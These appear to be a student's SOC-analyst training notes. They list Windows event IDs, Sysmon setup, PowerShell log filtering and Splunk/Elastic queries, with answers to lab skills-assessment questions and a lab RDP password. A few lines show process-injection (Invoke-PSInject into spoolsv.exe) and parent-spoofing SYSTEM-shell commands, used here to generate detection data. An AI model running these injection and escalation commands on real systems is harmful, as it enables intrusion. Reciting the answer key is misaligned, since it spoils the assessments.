  <a href="#ssl-renegotiation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      SSL Renegotiation Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#strange-telnet-udp-connections" class="md-nav__link">
    <span class="md-ellipsis">
      Strange Telnet &amp; UDP Connections
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#working-with-idsips" class="md-nav__link">
    <span class="md-ellipsis">
      Working with IDS/IPS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Working with IDS/IPS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#suricata" class="md-nav__link">
    <span class="md-ellipsis">
      Suricata
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#suricata-rule-development-part-1" class="md-nav__link">
    <span class="md-ellipsis">
      Suricata Rule Development Part 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snort" class="md-nav__link">
    <span class="md-ellipsis">
      Snort
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#zeek" class="md-nav__link">
    <span class="md-ellipsis">
      Zeek
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-malware-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to Malware Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to Malware Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-internals" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Internals
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#static-analysis-on-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Static Analysis On Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#static-analysis-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Static Analysis On Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#code-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Code Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-detection-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Creating Detection Rules
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#javascript-deobfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      JavaScript Deobfuscation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="JavaScript Deobfuscation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#deobfuscate" class="md-nav__link">
    <span class="md-ellipsis">
      Deobfuscate
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#yara-sigma-for-soc-analysts" class="md-nav__link">
    <span class="md-ellipsis">
      YARA &amp; Sigma for SOC Analysts
    </span>
  </a>
  
    <nav class="md-nav" aria-label="YARA & Sigma for SOC Analysts">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#yara-and-yara-rules" class="md-nav__link">
    <span class="md-ellipsis">
      YARA and YARA Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#developing-yara-rule" class="md-nav__link">
    <span class="md-ellipsis">
      Developing YARA Rule
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-yara-windows-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with YARA (Windows Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-yara-linux-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with YARA (Linux Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-yara-web-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with YARA (Web Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sigma-and-sigma-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Sigma and Sigma Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#developing-sigma-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Developing Sigma Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-sigma-chainsaw-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with Sigma (Chainsaw Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-sigma-splunk-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with Sigma (Splunk Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_1" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-digital-forensics" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to Digital Forensics
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to Digital Forensics">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-forensics-overview" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Forensics Overview
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evidence-acquisition-techniques-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Evidence Acquisition Techniques &amp; Tools
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memory-forensics" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Forensics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disk-forensics" class="md-nav__link">
    <span class="md-ellipsis">
      Disk Forensics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rapid-triage-examination-analysis-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Rapid Triage Examination &amp; Analysis Tools
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#practical-digital-forensics-scenario" class="md-nav__link">
    <span class="md-ellipsis">
      Practical Digital Forensics Scenario
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_2" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detecting-windows-attacks-with-splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Windows Attacks with Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Detecting Windows Attacks with Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#detecting-common-userdomain-recon" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Common User/Domain Recon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-password-spraying" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Password Spraying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-responder-like-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Responder-like Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-kerberoastingas-reproasting" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Kerberoasting/AS-REProasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Pass-the-Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-pass-the-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Pass-the-Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-overpass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Overpass-the-Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-golden-ticketssilver-tickets" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Golden Tickets/Silver Tickets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-unconstrained-delegationconstrained-delegation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Unconstrained Delegation/Constrained Delegation Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-dcsyncdcshadow" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting DCSync/DCShadow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-rdp-brute-force-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting RDP Brute Force Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-beaconing-malware" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Beaconing Malware
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-nmap-port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Nmap Port Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-kerberos-brute-force-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Kerberos Brute Force Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Kerberoasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-golden-tickets" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Golden Tickets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-cobalt-strikes-psexec" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Cobalt Strike's PSExec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-zerologon" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Zerologon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-exfiltration-http" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Exfiltration (HTTP)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-exfiltration-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Exfiltration (DNS)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-ransomware" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Ransomware
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_3" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="soc-analyst-pathway">SOC Analyst Pathway</h1>
<h2 id="useful-windows-event-logs">Useful Windows Event Logs</h2>
<pre><code class="language-bash">$ xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v:[Target IP] /dynamic-resolution
</code></pre>
<h4 id="1-windows-system-logs">1. Windows System Logs</h4>
<p><strong>Event ID 1074 (System Shutdown/Restart):</strong> This event log indicates when and why the system was shut down or restarted. By monitoring these events, you can determine if there are unexpected shutdowns or restarts, potentially revealing malicious activity such as malware infection or unauthorized user access.</p>
<p><strong>Event ID 6005 (The Event log service was started):</strong> This event log marks the time when the Event Log Service was started. This is an important record, as it can signify a system boot-up, providing a starting point for investigating system performance or potential security incidents around that period. It can also be used to detect unauthorized system reboots.</p>
<p><strong>Event ID 6006 (The Event log service was stopped):</strong> This event log signifies the moment when the Event Log Service was stopped. It is typically seen when the system is shutting down. Abnormal or unexpected occurrences of this event could point to intentional service disruption for covering illicit activities.</p>
<p><strong>Event ID 6013 (Windows uptime):</strong> This event occurs once a day and shows the uptime of the system in seconds. A shorter than expected uptime could mean the system has been rebooted, which could signify a potential intrusion or unauthorized activities on the system.</p>
<p><strong>Event ID 7040 (Service status change):</strong> This event indicates a change in service startup type, which could be from manual to automatic or vice versa. If a crucial service's startup type is changed, it could be a sign of system tampering.</p>
<h4 id="2-windows-security-logs">2. Windows Security Logs</h4>
<p><strong>Event ID 1102 (The audit log was cleared):</strong> Clearing the audit log is often a sign of an attempt to remove evidence of an intrusion or malicious activity.</p>
<p><strong>Event ID 1116 (Antivirus malware detection):</strong> This event is particularly important because it logs when Defender detects a malware. A surge in these events could indicate a targeted attack or widespread malware infection.
Event ID 1118 (Antivirus remediation activity has started): This event signifies that Defender has begun the process of removing or quarantining detected malware. It's important to monitor these events to ensure that remediation activities are successful.</p>
<p><strong>Event ID 1119 (Antivirus remediation activity has succeeded):</strong> This event signifies that the remediation process for detected malware has been successful. Regular monitoring of these events will help ensure that identified threats are effectively neutralized.</p>
<p><strong>Event ID 1120 (Antivirus remediation activity has failed):</strong> This event is the counterpart to 1119 and indicates that the remediation process has failed. These events should be closely monitored and addressed immediately to ensure threats are effectively neutralized.</p>
<p><strong>Event ID 4624 (Successful Logon):</strong> This event records successful logon events. This information is vital for establishing normal user behavior. Abnormal behavior, such as logon attempts at odd hours or from different locations, could signify a potential security threat.</p>
<p><strong>Event ID 4625 (Failed Logon):</strong> This event logs failed logon attempts. Multiple failed logon attempts could signify a brute-force attack in progress.</p>
<p><strong>Event ID 4648 (A logon was attempted using explicit credentials):</strong> This event is triggered when a user logs on with explicit credentials to run a program. Anomalies in these logon events could indicate lateral movement within a network, which is a common technique used by attackers.</p>
<p><strong>Event ID 4656 (A handle to an object was requested):</strong> This event is triggered when a handle to an object (like a file, registry key, or process) is requested. This can be a useful event for detecting attempts to access sensitive resources.</p>
<p><strong>Event ID 4672 (Special Privileges Assigned to a New Logon):</strong> This event is logged whenever an account logs on with super user privileges. Tracking these events helps to ensure that super user privileges are not being abused or used maliciously.</p>
<p><strong>Event ID 4698 (A scheduled task was created):</strong> This event is triggered when a scheduled task is created. Monitoring this event can help you detect persistence mechanisms, as attackers often use scheduled tasks to maintain access and run malicious code.</p>
<p><strong>Event ID 4700 &amp; Event ID 4701 (A scheduled task was enabled/disabled):</strong> This records the enabling or disabling of a scheduled task. Scheduled tasks are often manipulated by attackers for persistence or to run malicious code, thus these logs can provide valuable insight into suspicious activities.</p>
<p><strong>Event ID 4702 (A scheduled task was updated):</strong> Similar to 4698, this event is triggered when a scheduled task is updated. Monitoring these updates can help detect changes that may signify malicious intent.</p>
<p><strong>Event ID 4719 (System audit policy was changed):</strong> This event records changes to the audit policy on a computer. It could be a sign that someone is trying to cover their tracks by turning off auditing or changing what events get audited.</p>
<p><strong>Event ID 4738 (A user account was changed):</strong> This event records any changes made to user accounts, including changes to privileges, group memberships, and account settings. Unexpected account changes can be a sign of account takeover or insider threats.</p>
<p><strong>Event ID 4771 (Kerberos pre-authentication failed):</strong> This event is similar to 4625 (failed logon) but specifically for Kerberos authentication. An unusual amount of these logs could indicate an attacker attempting to brute force your Kerberos service.</p>
<p><strong>Event ID 4776 (The domain controller attempted to validate the credentials for an account):</strong> This event helps track both successful and failed attempts at credential validation by the domain controller. Multiple failures could suggest a brute-force attack.</p>
<p><strong>Event ID 5001 (Antivirus real-time protection configuration has changed):</strong> This event indicates that the real-time protection settings of Defender have been modified. Unauthorized changes could indicate an attempt to disable or undermine the functionality of Defender.</p>
<p><strong>Event ID 5140 (A network share object was accessed):</strong> This event is logged whenever a network share is accessed. This can be critical in identifying unauthorized access to network shares.</p>
<p><strong>Event ID 5142 (A network share object was added):</strong> This event signifies the creation of a new network share. Unauthorized network shares could be used to exfiltrate data or spread malware across a network.</p>
<p><strong>Event ID 5145 (A network share object was checked to see whether client can be granted desired access):</strong> This event indicates that someone attempted to access a network share. Frequent checks of this sort might indicate a user or a malware trying to map out the network shares for future exploits.</p>
<p><strong>Event ID 5157 (The Windows Filtering Platform has blocked a connection):</strong> This is logged when the Windows Filtering Platform blocks a connection attempt. This can be helpful for identifying malicious traffic on your network.</p>
<p><strong>Event ID 7045 (A service was installed in the system):</strong> A sudden appearance of unknown services might suggest malware installation, as many types of malware install themselves as services.</p>
<h2 id="windows-event-logging-basics-exercises">Windows Event Logging Basics exercises</h2>
<p>Analyze the event with ID 4624, that took place on 8/3/2022 at 10:23:25. Conduct a similar investigation as outlined in this section and provide the name of the executable responsible for the modification of the auditing settings as your answer. Answer format: T_W_____.exe</p>
<p><img alt="alt text" src="../assets/image.png" /></p>
<p>The point is to see what changed after the logon. After the successful logon (4624), the user conduct 4907 (Auditing settings on object were changed.)</p>
<p><img alt="alt text" src="../assets/image1.png" /></p>
<p><em>Answer:</em> TiWorker.exe</p>
<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">System monitor event ID</a></p>
<p>MD5=1F009DE6A013A282D07436241512C056,SHA256=C897C345C3BCF3E96589A0FEEEA8B6D26CF33C091AC3EE2162DD27F8A79C3FF5,IMPHASH=48D15928B7CDAE9E088E08F2C8DE7CFE
Signed: true</p>
<pre><code class="language-bash">C:\Tools\Sysmon&gt; sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
</code></pre>
<pre><code class="language-xml">&lt;ImageLoad onmatch=&quot;exclude&quot;&gt;
            &lt;!--NOTE: Using &quot;include&quot; with no rules means nothing in this section will be logged--&gt;
&lt;/ImageLoad&gt;
</code></pre>
<pre><code class="language-bash">C:\Tools\Sysmon&gt; sysmon.exe -c sysmonconfig-export.xml
</code></pre>
<p><a href="https://processhacker.sourceforge.io/">ProcessHacker</a></p>
<pre><code class="language-powershell">powershell -ep bypass
Import-Module .\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode &quot;V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi&quot;
</code></pre>
<pre><code class="language-bash">PS C:\Tools\psgetsystem&gt; powershell -ep bypass
PS C:\Tools\psgetsystem&gt; Import-Module .\psgetsys.ps1 
PS C:\Tools\psgetsystem&gt; [MyProcess]::CreateProcessFromParent([Process ID of spoolsv.exe],&quot;C:\Windows\System32\cmd.exe&quot;,&quot;&quot;)

c:\Tools\SilkETW_SilkService_v8\v8\SilkETW&gt;SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json

PS C:\Tools\GhostPack Compiled Binaries&gt;.\Seatbelt.exe TokenPrivileges

c:\Tools\SilkETW_SilkService_v8\v8\SilkETW&gt;SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json
</code></pre>
<pre><code class="language-bash">PS C:\Users\Administrator&gt; Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Format-Table -AutoSize

PS C:\Users\Administrator&gt; Get-WinEvent -ListProvider * | Format-Table -AutoSize

# Retrieving events from the System log
PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'System' -MaxEvents 50 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Retrieving events from Microsoft-Windows-WinRM/Operational
PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Retrieving events from .evtx Files
PS C:\Users\Administrator&gt; Get-WinEvent -Path 'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\exec_sysmon_1_lolbin_pcalua.evtx' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Filtering events with FilterHashtable
PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{Path='C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\sysmon_mshta_sharpshooter_stageless_meterpreter.evtx'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# get event logs based on a date range (5/28/23 - 6/2/2023)
PS C:\Users\Administrator&gt; $startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date
PS C:\Users\Administrator&gt; $endDate   = (Get-Date -Year 2023 -Month 6 -Day 3).Date
PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$startDate; EndTime=$endDate} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Filtering events with FilterHashtable &amp; XML
PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
`ForEach-Object {
$xml = [xml]$_.ToXml()
$eventData = $xml.Event.EventData.Data
New-Object PSObject -Property @{
    SourceIP = $eventData | Where-Object {$_.Name -eq &quot;SourceIp&quot;} | Select-Object -ExpandProperty '#text'
    DestinationIP = $eventData | Where-Object {$_.Name -eq &quot;DestinationIp&quot;} | Select-Object -ExpandProperty '#text'
    ProcessGuid = $eventData | Where-Object {$_.Name -eq &quot;ProcessGuid&quot;} | Select-Object -ExpandProperty '#text'
    ProcessId = $eventData | Where-Object {$_.Name -eq &quot;ProcessId&quot;} | Select-Object -ExpandProperty '#text'
}
}  | Where-Object {$_.DestinationIP -eq &quot;52.113.194.132&quot;}

PS C:\Users\Administrator&gt; $Query = @&quot;
    &lt;QueryList&gt;
        &lt;Query Id=&quot;0&quot;&gt;
            &lt;Select Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt;*[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]
            &lt;/Select&gt;
        &lt;/Query&gt;
    &lt;/QueryList&gt;
    &quot;@
PS C:\Users\Administrator&gt; Get-WinEvent -FilterXml $Query | ForEach-Object {Write-Host $_.Message `n}

# Filtering events with FilterXPath
PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath &quot;*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and *[EventData[Data[@Name='CommandLine']='`&quot;C:\Windows\system32\reg.exe`&quot; ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]&quot; | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath &quot;*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='52.113.194.132']]&quot;

# Filtering events based on property values
PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1 | Select-Object -Property *

PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Properties[21].Value -like &quot;*-enc*&quot;} | Format-List
</code></pre>
<pre><code class="language-bash">Get-WinEvent -FilterHashtable @{Path='C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Lateral Movement\*.evtx'} | Where-Object{$_.Message -like &quot;*\\*\PRINT*&quot;}  | Format-Table -AutoSize

\\*\PRINT

Get-WinEvent Microsoft-Windows-WLAN-AutoConfig/Operational | Where-Object{$_.Message -like &quot;*$SearchString*&quot;}    
</code></pre>
<p><img alt="alt text" src="../assets/image2.png" />
12:30:30</p>
<h4 id="skill-assessment">Skill assessment</h4>
<p><strong>Q1:</strong> By examining the logs located in the "C:\Logs\DLLHijack" directory, determine the process responsible for executing a DLL hijacking attack. Enter the process name as your answer. Answer format: _.exe</p>
<ol>
<li>
<p>modify the sysmonconfig file with this changes (Imageload Onmatch = exclusive )
Update it in cmd with (sysmon.exe -c ….)</p>
</li>
<li>
<p>open Event viewer and open saved logs. Filter event id equals 7 and search for 'wininet.dll'. </p>
</li>
</ol>
<p><strong>Q2:</strong> By examining the logs located in the "C:\Logs\PowershellExec" directory, determine the process that <strong>executed</strong> unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe</p>
<ol>
<li>
<p>correctly configure the sysmon. and open saved logs in Event viewer</p>
</li>
<li>
<p>Filter event id 7 and search 'wininet.dll' or 'clr.dll' or 'clrjit.dll' and see if anything process is weird. Or search '.Net'</p>
</li>
</ol>
<p><strong>Q3:</strong> By examining the logs located in the "C:\Logs\PowershellExec" directory, determine the process that <strong>injected</strong> into the process that executed unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe</p>
<p>In Q2 we know the process id is 3776, we need to find its parent process. Who create this thread.</p>
<pre><code>In the Sysmon event ID 8 (CreateRemoteThread), a log is generated when a process creates a thread in another process by using the CreateRemoteThread function. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process.
</code></pre>
<p>So, filter event id 8 and find the TargetProcessId: 3776.</p>
<p><strong>Q4:</strong> By examining the logs located in the "C:\Logs\Dump" directory, determine the process that performed an LSASS dump. Enter the process name as your answer. Answer format: _.exe</p>
<pre><code class="language-xml"># event id is 10
&lt;ProcessAccess onmatch=&quot;exclude&quot;&gt;
            &lt;!--NOTE: Using &quot;include&quot; with no rules means nothing in this section will be logged--&gt;
&lt;/ProcessAccess&gt;
</code></pre>
<p>Filter event id 10 and search 'lsass.exe', trying every exe file that looks malicious.</p>
<p>processhacker.exe</p>
<p><strong>Q5:</strong> By examining the logs located in the "C:\Logs\Dump" directory, determine if an ill-intended login took place after the LSASS dump. Answer format: Yes or No</p>
<p>No</p>
<p><strong>Q6:</strong> By examining the logs located in the "C:\Logs\StrangePPID" directory, determine a process that was used to temporarily execute code based on a strange parent-child relationship. Enter the process name as your answer. Answer format: _.exe</p>
<p>SourceImage: C:\Windows\System32\svchost.exe
TargetProcessGUID: {67e39d39-f935-6269-8203-000000000300}
TargetProcessId: 7780
TargetImage: C:\Windows\System32\werfault.exe</p>
<h2 id="hunting-for-stuxbot">Hunting For Stuxbot</h2>
<p><strong>Q3:</strong></p>
<p><code>powershell.file.script_block_text : P*V*</code></p>
<p><img alt="alt text" src="../assets/image3.png" /></p>
<h4 id="hunting-for-stuxbot-round-2">Hunting For Stuxbot (Round 2)</h4>
<p><strong>Q1:</strong></p>
<p><code>"C:\Users\Public*" and event.code: 11</code></p>
<p>Sysmon id 11: FileCreate, Event ID 11 contains details about the file's path, the operation that created or modified the file, and the file's hash.</p>
<p><strong>Q2:</strong></p>
<p><code>event.code:13 AND registry.path: *Run*</code></p>
<p>Sysmon Event ID 13 - RegistryEvent (Value Set)</p>
<p>This Registry event type identifies Registry value modifications. The event records the value written for Registry values of type DWORD and QWORD .</p>
<p><strong>Q3:</strong></p>
<p><code>powershell.file.script_block_text: *Enter-PSSession* and event.code:4104</code></p>
<p>Event 4104 will capture PowerShell commands and show script block logging. A great indicator that PowerShell was executed is Event ID 400. PowerShell's Event ID 400 will detail when the EngineState has started. You may also be wondering how we can correlate an Event ID 400 with an Event ID 4103.</p>
<h2 id="understanding-log-sources-investigating-with-splunk">Understanding Log Sources &amp; Investigating with Splunk</h2>
<p><code>search index="main" "UNKNOWN"</code></p>
<p>UNKNOWN is used as a keyword to filter and retrieve events that include this specific term.</p>
<p><code>index="main" "*UNKNOWN*"</code></p>
<p><code>index="main" EventCode!=1</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | fields - User</code></p>
<p>the fields command excludes the User field from the search results. </p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | table _time, host, Image</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rename Image as Process</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | dedup Image</code></p>
<p>The 'dedup' command removes duplicate events. </p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | sort - _time</code></p>
<p>the most recent events are shown first.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | stats count by _time, Image</code></p>
<p>The stats command performs statistical operations. </p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | chart count by _time, Image</code></p>
<p>The chart command creates a data visualization based on statistical operations.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | eval Process_Path=lower(Image)</code></p>
<p>The eval command creates or redefines fields. This command creates a new field Process_Path which contains the lowercase version of the Image field. It doesn't change the actual Image field, but creates a new field that can be used in subsequent operations or for display purposes.</p>
<p><code>index="main" EventCode=4662 | rex max_match=0 "[^%](?&lt;guid&gt;{.*})" | table guid</code></p>
<p>The rex command extracts new fields from existing ones using regular expressions.</p>
<p><code>rex max_match=0 "[^%](?&lt;guid&gt;{.*})"</code> uses the rex command to extract values matching the pattern from the events' fields. The regex pattern {.*} looks for substrings that begin with { and end with }. The [^%] part ensures that the match does not begin with a % character. The captured value within the curly braces is assigned to the named capture group guid.</p>
